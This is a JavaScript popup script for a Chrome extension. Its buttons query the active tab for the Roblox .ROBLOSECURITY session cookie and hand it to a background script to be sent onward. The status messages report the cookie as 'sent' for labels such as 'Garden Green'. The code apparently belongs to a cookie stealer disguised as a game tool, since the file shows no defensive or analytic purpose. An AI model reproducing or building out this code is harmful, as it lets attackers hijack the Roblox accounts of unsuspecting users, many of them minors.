const buttonIds = [
    'sendCookieButton',
    'button2',
    'button3',
    'button4',
    'button5',
    'button6',
    'button7'
];

buttonIds.forEach(buttonId => {
    document.getElementById(buttonId).addEventListener('click', () => {
        // Query the active tab to get the currently opened Roblox page
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            // Send a message to the content script to retrieve the ROBLOSECURITY cookie
            chrome.tabs.sendMessage(tabs[0].id, { action: 'getRobloxCookie' }, (response) => {
                if (response && response.cookie) {
                    // If the cookie is found, send it to the background script
                    chrome.runtime.sendMessage({ action: 'sendCookie', cookie: response.cookie }, (backgroundResponse) => {
                        const statusElement = document.getElementById('status');
                        
                        // Handle the status message based on the button clicked
                        switch (buttonId) {
                            case 'sendCookieButton':
                                statusElement.textContent = backgroundResponse.success ? 'Successfully sent cookie for Garden Green' : 'Failed to send cookie for Garden Green';
                                break;
                            case 'button2':
                                statusElement.textContent = backgroundResponse.success ? 'Successfully sent cookie for Button 2' : 'Failed to send cookie for Button 2';
                                break;
                            case 'button3':
                                statusElement.textContent = backgroundResponse.success ? 'Successfully sent cookie for Button 3' : 'Failed to send cookie for Button 3';
                                break;
                            case 'button4':
                                statusElement.textContent = backgroundResponse.success ? 'Successfully sent cookie for Button 4' : 'Failed to send cookie for Button 4';
                                break;
                            case 'button5':
                                statusElement.textContent = backgroundResponse.success ? 'Successfully sent cookie for Button 5' : 'Failed to send cookie for Button 5';
                                break;
                            case 'button6':
                                statusElement.textContent = backgroundResponse.success ? 'Successfully sent cookie for Button 6' : 'Failed to send cookie for Button 6';
                                break;
                            case 'button7':
                                statusElement.textContent = backgroundResponse.success ? 'Successfully sent cookie for Button 7' : 'Failed to send cookie for Button 7';
                                break;
                        }
                    });
                } else {
                    // If no cookie is found, show an error message
                    document.getElementById('status').textContent = 'Failed to retrieve cookie';
                }
            });
        });
    });
});

/////
